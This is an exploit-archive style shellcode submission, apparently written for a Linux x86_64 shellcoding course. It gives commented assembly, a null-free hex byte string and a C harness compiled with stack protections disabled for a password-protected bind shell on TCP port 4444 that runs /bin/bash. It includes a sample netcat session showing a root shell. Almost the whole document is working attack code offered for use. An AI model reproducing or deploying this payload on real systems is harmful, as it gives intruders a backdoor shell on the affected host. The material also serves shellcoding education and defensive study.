## Exploit Title: Linux/x64 - Password Protected Bindshell + Null-free Shellcode (272 Bytes)
## Exploit Author: Bobby Cooke
## Date: 2020-04-23
## Tested on: Linux x86_64 SMP Debian 5.3.15-1kali1
## SLAE/Student ID: PA-10913
## Course: This shellcode was created for the x86_64 Assembly Language and Shellcoding on Linux (SLAE64) Course offered at pentesteracademy.com.
## Description: Dynamic, Null-free shellcode that spawns a bindshell on TCP port 4444; on all the network interfaces of the host. The bindshell is password protected. The password 'P3WP3Wl4ZerZ' must be entered before execve will spawn a bash shell for the connecting client.
## Example:
#    user$ nc 127.0.0.1 4444
#    M@G1C WOrDz IZ??asd
#    REALLY?!M@G1C WOrDz IZ??P3WP3Wl4ZerZ
#    id
#    uid=0(root) gid=0(root) groups=0(root)

; int ipv4Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
; rax = 0x29               ; rdi = 0x2  = AF_INET
; rsi = 0x1  = SOCK_STREAM ; rdx = 0x0  = IPPROTO_IP
xor rsi, rsi   ; clear rsi
mul rsi        ; clear rax, rdx ; rdx = 0x0 = IPPROTO_IP
add al, 0x29   ; rax = 0x29 = socket syscall
inc rsi        ; rsi = 0x1 = SOCK_STREAM
push rsi
pop rdi        ; rdi = 0x1
inc rdi        ; rdi = 0x2 = AF_INET
syscall        ; socket syscall ; RAX returns socket File-Descriptor

; bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));
; rax = 0x31               ; rdi = 0x3  =  ipv4Socket
; rsi = &ipSocketAddr      ; rdi = 0x10
;          02 00 11 5c 00 00 00 00 00 00 00 00 00 00 00 00
; Address-Family| PORT| IP Address| 8 bytes of zeros
xchg rdi, rax    ; RDI = sockfd / ipv4Socket
xor rax, rax
add al, 0x31     ; rax = 0x31 = socket syscall
push rdx         ; 8 bytes of zeros for second half of struct
push dx          ; 4 bytes of zeros for IPADDR_ANY
push dx          ; 4 bytes of zeros for IPADDR_ANY
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx          ; rdx = 0x2 ; dx = 0x0002
push dx          ; 0x2 = AF_INET
add dl, 0xe      ; rdi = 0x10 = sizeof(ipSocketAddr)
mov rsi, rsp     ; rsi = &ipSocketAddr
syscall

; int listen(int sockfd, int backlog);
; rax = 0x32   = listen syscall
; rdi = sockfd = 0x3 = ipv4Socket   ; rsi = backlog = 0
xor rax, rax
add al, 0x32     ; listen syscall
xor rsi, rsi     ; backlog = 0x0
syscall

;accept
; rax = 0x2b ; rdi = sockfd  = 0x3 = ipv4Socket
; rsi = 0x0  ; rdx = 0x0
xor rax, rax
push rax
push rax
pop rdx
pop rsi
add al, 0x2b  ; accept syscall
syscall       ; accept returns client socket file-descriptor in RAX

; dup2
xchg rdi, rax    ; RDI = sockfd / ClientSocketFD
xor rsi, rsi
add dl, 0x3      ; Loop Counter
dup2Loop:
xor rax, rax
add al, 0x21     ; RAX = 0x21 = dup2 systemcall
syscall          ; call dup2 x3 to redirect STDIN STDOUT STDERR
inc rsi
cmp rsi, rdx     ; if 2-STDERR, end loop
jne dup2Loop

jmp short password

failer:
; write
; rax = 0x1     ; rdi = fd = 0x1 STDOUT
; rsi = &String ; rdx = sizeof(String)
; String = "REALLY?!"
;  !?YLLAER : 213f594c4c414552
xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
mov rsi, 0x213f594c4c414552
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 16     ; 16 bytes / size of string
syscall

password:
; write
; rax = 0x1     ; rdi = fd = 0x1 STDOUT
; rsi = &String ; rdx = sizeof(String)
; String = "M@G1C WOrDz IZ??"
;  ??ZI zDr : 3f3f5a49207a4472
;  OW C1G@M : 4f5720433147404d
xor rdi, rdi
mul rdi
push rdi
pop rsi
push rsi
mov rsi, 0x3f3f5a49207a4472 ; ??ZI zDr
push rsi
mov rsi, 0x4f5720433147404d ; OW C1G@M
push rsi
mov rsi, rsp    ; rsi = &String
inc rax         ; rax = 0x1 = write system call
mov rdi, rax
add rdx, 16     ; 16 bytes / size of string
syscall

; read
; rax = 0x0 = read syscall ; rdi = fd = 0x0 STDIN
; rsi = Write to &String   ; rdx = 0x12 = sizeof(String)
xor rdi, rdi
push rdi
mul rdi         ; rdx =0x0 ; rax = 0x0 = write system call
mov rsi, rsp    ; rsi = [RSP] = &String
add rdx, 12     ; 12 bytes / size of password
syscall

; String = P3WP3Wl4ZerZ
;  ZreZ : 5a72655a
;  4lW3PW3P : 346c573350573350
mov rdi, rsp
xor rsi, rsi
add rsi, 0x5a72655a
push rsi
mov rsi, 0x346c573350573350
push rsi
mov rsi, rsp    ; rsi = &String
xor rcx, rcx
add rcx, 0xB
repe cmpsb
jnz failer

;execve
; rax = 0x3b ; rdi = Pointer -> "/bin/bash"0x00
; rsi = 0x0  ; rdx = 0x0
; "/bin/bash"
;  h : 68
;  sab/nib/ : 7361622f6e69622f
xor rsi, rsi
mul rsi          ; rdx&rax= 0x0
xor rdi, rdi
push rdi
add rdx, 0x68 ; "h"
push rdx
mov rdx, 0x7361622f6e69622f ; "/bin/bas"
push rdx
xor rdx, rdx
mov rdi, rsp
mov al, 0x3b ; execve syscall
syscall  ; call execve("/bin/bash", NULL, NULL)

################################################################################

// Filename: shellcode.c
// Compile:  gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
"\x48\x31\xf6\x48\xf7\xe6\x04\x29\x48\xff\xc6\x56\x5f\x48\xff\xc7"
"\x0f\x05\x48\x97\x48\x31\xc0\x04\x31\x52\x66\x52\x66\x52\x66\x68"
"\x11\x5c\x48\xff\xc2\x48\xff\xc2\x66\x52\x80\xc2\x0e\x48\x89\xe6"
"\x0f\x05\x48\x31\xc0\x04\x32\x48\x31\xf6\x0f\x05\x48\x31\xc0\x50"
"\x50\x5a\x5e\x04\x2b\x0f\x05\x48\x97\x48\x31\xf6\x80\xc2\x03\x48"
"\x31\xc0\x04\x21\x0f\x05\x48\xff\xc6\x48\x39\xd6\x75\xf1\xeb\x23"
"\x48\x31\xff\x48\xf7\xe7\x57\x5e\x56\x48\xbe\x52\x45\x41\x4c\x4c"
"\x59\x3f\x21\x56\x48\x89\xe6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc2"
"\x10\x0f\x05\x48\x31\xff\x48\xf7\xe7\x57\x5e\x56\x48\xbe\x72\x44"
"\x7a\x20\x49\x5a\x3f\x3f\x56\x48\xbe\x4d\x40\x47\x31\x43\x20\x57"
"\x4f\x56\x48\x89\xe6\x48\xff\xc0\x48\x89\xc7\x48\x83\xc2\x10\x0f"
"\x05\x48\x31\xff\x57\x48\xf7\xe7\x48\x89\xe6\x48\x83\xc2\x0c\x0f"
"\x05\x48\x89\xe7\x48\x31\xf6\x48\x81\xc6\x5a\x65\x72\x5a\x56\x48"
"\xbe\x50\x33\x57\x50\x33\x57\x6c\x34\x56\x48\x89\xe6\x48\x31\xc9"
"\x48\x83\xc1\x0b\xf3\xa6\x0f\x85\x74\xff\xff\xff\x48\x31\xf6\x48"
"\xf7\xe6\x48\x31\xff\x57\x48\x83\xc2\x68\x52\x48\xba\x2f\x62\x69"
"\x6e\x2f\x62\x61\x73\x52\x48\x31\xd2\x48\x89\xe7\xb0\x3b\x0f\x05";
int main()
{
    printf("Shellcode Length:  %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}